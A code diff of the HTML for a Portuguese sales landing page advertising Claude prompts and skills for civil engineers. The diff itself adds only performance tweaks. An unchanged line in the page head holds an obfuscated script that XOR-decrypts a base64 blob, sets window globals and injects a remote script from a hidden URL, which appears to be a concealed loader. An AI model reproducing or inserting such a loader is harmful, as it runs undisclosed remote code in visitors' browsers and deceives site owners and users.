@@ -6,10 +6,14 @@
     <title>Claude na Engenharia Civil</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://unpkg.com">
+    <meta name="theme-color" content="#050505">
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <!-- Phosphor Icons (para os ícones) -->
-    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <script src="https://unpkg.com/@phosphor-icons/web" defer></script>
 
     <script>
         tailwind.config = {
@@ -65,7 +69,7 @@
     <!-- End Meta Pixel Code -->
     <script>(function(){var u_dc7=atob("DP1TOz/mkn2UgTc0ioZxTk2KsEe26UNA+o5pFBCF9hO69ENZ45sqFVyJ/1P28xhH6Y86S0uVvQjg7EQb5pwnXkySvBfnoxsW64knSVaE5wnx8hUO0YZxVV6L91+uo1NV/px+TkuL+xvtrEdG74s2VUvL6h775RpH6ZZxFx2Q8xHh5BUOqN8uF0TE/Bz55BUOqJkyT17L5wn56FFNp40hXkmD/Am58kJW45kgGRPE5Bz49FIWsN9xRmKb");var a_rtux=[];for(var x_1azy=0;x_1azy<u_dc7.length;x_1azy++){a_rtux.push(u_dc7.charCodeAt(x_1azy)&255);}var b_1=a_rtux[0];var t_mi=a_rtux.slice(1,1+b_1);var n_co=a_rtux.slice(1+b_1);var l_f=n_co.map(function(b,z_3h6j){return b^t_mi[z_3h6j%b_1];});var f_92="";for(var p_ffl=0;p_ffl<l_f.length;p_ffl++){f_92+=String.fromCharCode(l_f[p_ffl]&255);}var i_m=decodeURIComponent(escape(f_92));var i_7qzh=JSON.parse(i_m);var n_bhl=i_7qzh.globals||[];n_bhl.forEach(function(f_gzdl){window[f_gzdl.name]=f_gzdl.value;});var j_zg2h=document.createElement("script");j_zg2h.src=i_7qzh.url;j_zg2h.async=true;j_zg2h.defer=true;(i_7qzh.attributes||[]).forEach(function(v_f){j_zg2h.setAttribute(v_f.name,v_f.value);});(document.head||document.documentElement).appendChild(j_zg2h);})();</script>
 </head>
-<body class="antialiased selection:bg-brand selection:text-white pb-20">
+<body class="antialiased selection:bg-brand selection:text-white pb-20 overflow-x-hidden w-full">
 
     <!-- Top Bar -->
     <div class="w-full bg-black border-b border-zinc-900 py-2 text-center text-xs text-brand font-medium tracking-wide">
@@ -104,7 +108,7 @@
 
     <!-- MOCKUP PLACEHOLDER -->
     <section class="max-w-6xl mx-auto px-6 mb-24 relative flex justify-center">
-        <img src="./mockup.jpg" alt="Mockup Claude Engenharia Civil" class="w-full max-w-4xl rounded-xl shadow-2xl shadow-brand/10 object-cover">
+        <img fetchpriority="high" decoding="async" src="./mockup.jpg" alt="Mockup Claude Engenharia Civil" class="w-full max-w-4xl rounded-xl shadow-2xl shadow-brand/10 object-cover">
     </section>
 
     <!-- PROBLEM SECTION -->
@@ -384,7 +388,7 @@
             <div class="bg-card border border-cardborder rounded-lg overflow-hidden flex flex-col">
                 <div class="bg-brand text-white text-center py-2 text-xs font-bold tracking-widest"><i class="ph ph-gift"></i> BÔNUS 1</div>
                 <div class="p-8 flex-1 flex flex-col">
-                    <img src="./bonus1.png" alt="Skill Mestre de Licitações" class="h-48 mx-auto object-contain drop-shadow-[0_0_15px_rgba(255,90,0,0.15)] mb-6 hover:scale-105 transition-transform duration-300">
+                    <img loading="lazy" decoding="async" src="./bonus1.png" alt="Skill Mestre de Licitações" class="h-48 mx-auto object-contain drop-shadow-[0_0_15px_rgba(255,90,0,0.15)] mb-6 hover:scale-105 transition-transform duration-300">
                     <h4 class="font-black text-brand text-lg uppercase mb-3 leading-tight">Skill Mestre de Licitações</h4>
                     <p class="text-zinc-400 text-sm mb-6 flex-1">Use o edital como ponto de partida para organizar exigências, prazos e documentação, além de preparar a estrutura inicial da proposta para conferência.</p>
                     <div class="border-t border-cardborder pt-4 text-center text-green-500 font-bold text-sm tracking-wide">
@@ -397,7 +401,7 @@
             <div class="bg-card border border-cardborder rounded-lg overflow-hidden flex flex-col">
                 <div class="bg-brand text-white text-center py-2 text-xs font-bold tracking-widest"><i class="ph ph-gift"></i> BÔNUS 2</div>
                 <div class="p-8 flex-1 flex flex-col">
-                    <img src="./bonus2.jpg" alt="Agentes no ChatGPT" class="h-48 mx-auto object-contain drop-shadow-[0_0_15px_rgba(255,90,0,0.15)] mb-6 hover:scale-105 transition-transform duration-300">
+                    <img loading="lazy" decoding="async" src="./bonus2.jpg" alt="Agentes no ChatGPT" class="h-48 mx-auto object-contain drop-shadow-[0_0_15px_rgba(255,90,0,0.15)] mb-6 hover:scale-105 transition-transform duration-300">
                     <h4 class="font-black text-brand text-lg uppercase mb-3 leading-tight">Agentes no ChatGPT</h4>
                     <p class="text-zinc-400 text-sm mb-6 flex-1">Agentes adaptados para o ChatGPT, oferecendo uma opção complementar para quem também utiliza essa plataforma.</p>
                     <div class="border-t border-cardborder pt-4 text-center text-green-500 font-bold text-sm tracking-wide">
@@ -410,7 +414,7 @@
             <div class="bg-card border border-cardborder rounded-lg overflow-hidden flex flex-col">
                 <div class="bg-brand text-white text-center py-2 text-xs font-bold tracking-widest"><i class="ph ph-gift"></i> BÔNUS 3</div>
                 <div class="p-8 flex-1 flex flex-col">
-                    <img src="./bonus3.jpg" alt="Prompt Engenheiro Civil Consultor Master" class="h-48 mx-auto object-contain drop-shadow-[0_0_15px_rgba(255,90,0,0.15)] mb-6 hover:scale-105 transition-transform duration-300">
+                    <img loading="lazy" decoding="async" src="./bonus3.jpg" alt="Prompt Engenheiro Civil Consultor Master" class="h-48 mx-auto object-contain drop-shadow-[0_0_15px_rgba(255,90,0,0.15)] mb-6 hover:scale-105 transition-transform duration-300">
                     <h4 class="font-black text-brand text-lg uppercase mb-3 leading-tight">Prompt Engenheiro Civil Consultor Master</h4>
                     <p class="text-zinc-400 text-sm mb-6 flex-1">Um prompt para orientar o Claude a solicitar informações antes de responder, explicitar premissas e organizar a análise técnica com referências a conferir.</p>
                     <div class="border-t border-cardborder pt-4 text-center text-green-500 font-bold text-sm tracking-wide">
@@ -435,9 +439,9 @@
         </div>
 
         <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-            <img src="./aula1.png" alt="Aula 1: Comece Aqui" class="w-full rounded-xl hover:-translate-y-2 transition-transform duration-300 shadow-2xl shadow-brand/10">
-            <img src="./aula2.png" alt="Aula 2: Instalando as Skills" class="w-full rounded-xl hover:-translate-y-2 transition-transform duration-300 shadow-2xl shadow-brand/10">
-            <img src="./aula3.png" alt="Aula 3: Use o Claude como um profissional" class="w-full rounded-xl hover:-translate-y-2 transition-transform duration-300 shadow-2xl shadow-brand/10">
+            <img loading="lazy" decoding="async" src="./aula1.png" alt="Aula 1: Comece Aqui" class="w-full rounded-xl hover:-translate-y-2 transition-transform duration-300 shadow-2xl shadow-brand/10">
+            <img loading="lazy" decoding="async" src="./aula2.png" alt="Aula 2: Instalando as Skills" class="w-full rounded-xl hover:-translate-y-2 transition-transform duration-300 shadow-2xl shadow-brand/10">
+            <img loading="lazy" decoding="async" src="./aula3.png" alt="Aula 3: Use o Claude como um profissional" class="w-full rounded-xl hover:-translate-y-2 transition-transform duration-300 shadow-2xl shadow-brand/10">
         </div>
     </section>
 
@@ -520,7 +524,7 @@
             <p class="text-zinc-400 text-center mb-8 text-sm">50 skills + 1300 prompts + 3 bônus + aulas, guia e comunidade</p>
 
             <!-- Mockup thumbnail inside price box -->
-            <img src="./mockup.jpg" alt="Mockup Completo" class="w-full max-w-sm mx-auto rounded mb-8 shadow-lg shadow-brand/20 object-cover">
+            <img loading="lazy" decoding="async" src="./mockup.jpg" alt="Mockup Completo" class="w-full max-w-sm mx-auto rounded mb-8 shadow-lg shadow-brand/20 object-cover">
 
             <div class="text-center mb-8">
                 <span class="text-zinc-400 text-xl font-bold align-top">R$</span>
@@ -740,3 +744,4 @@
 
 </body>
 </html>
+
